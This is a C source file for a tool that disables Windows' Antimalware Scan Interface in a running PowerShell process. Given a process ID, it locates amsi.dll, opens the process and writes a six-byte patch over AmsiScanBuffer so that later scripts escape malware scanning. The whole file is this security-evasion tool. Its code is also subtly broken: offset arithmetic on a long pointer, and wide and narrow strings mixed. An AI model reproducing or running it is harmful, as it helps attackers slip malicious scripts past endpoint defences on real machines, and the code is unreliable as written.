// NOTE: Microsoft could change this at any time
// there are better methods for finding the offset on the fly
#define AMSI_SCAN_BUFFER_OFFSET 3048

#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

char* GetModuleBase(const wchar_t* ModuleName, DWORD procID);

int main(int argc, char *argv[])
{
	if(argc < 2)
	{
		printf("Usage: %s [PID of PowerShell process]\n", argv[0]);
		return -1;
	}
	
	// https://rastamouse.me/blog/asb-bypass-pt3/
	char payload[] = {0xB8, 0x57, 0x00, 0x07,0x80, 0xC3};
	
	// find the amsi.dll module address in the remote process
	long *addr = GetModuleBase("amsi.dll", (DWORD)atoi(argv[1]));
	
	if(addr == NULL)
	{
		printf("Unable to locate amsi.dll! Have you provided the correct PID?\n");
		return -1;
	}
	
	printf("Module Addr: %p\n", addr);
	
	// the AmsiScanBuffer() offset seems to be 3048 bytes - see note at top
	addr += AMSI_SCAN_BUFFER_OFFSET;

	printf("AmsiScanBuffer() Addr: %p\n", addr);
	
	// open the remote powershell process to patch it
	HANDLE hRemoteProcess = NULL;
	hRemoteProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, (DWORD)atoi(argv[1]));
	
	if(hRemoteProcess == NULL)
	{
		printf("Unable to open process!\n");
		printf("Error: %d\n", GetLastError());
		return -1;
	}
	
	// write the payload to the powershell process to patch it
    	if(!WriteProcessMemory(hRemoteProcess, addr, (PVOID)payload, (SIZE_T)6, (SIZE_T *)NULL))
	{
		printf("Failed to patch!\n");
		printf("Error: %d\n", GetLastError());
		return -1;
	}	
	
	printf("amsi.dll Patched!");
}

char* GetModuleBase(const wchar_t* ModuleName, DWORD procID)
{
    MODULEENTRY32 ModuleEntry = { 0 };
	
    // take a snapshot of the process memory
    HANDLE SnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, procID);

    if (!SnapShot)
    {
	    return NULL;
    }
	
    ModuleEntry.dwSize = sizeof(ModuleEntry);

    // get the first module in memory
    if (!Module32First(SnapShot, &ModuleEntry))
    {
	    return NULL;
    }
	
    // loop through the modules until we find the one we want
    do
    {
	    if (strcmp(ModuleEntry.szModule, ModuleName) == 0)
            {
                CloseHandle(SnapShot);
                return (char*)ModuleEntry.modBaseAddr;
            }
    } while (Module32Next(SnapShot, &ModuleEntry));

    CloseHandle(SnapShot);

    return NULL;
}
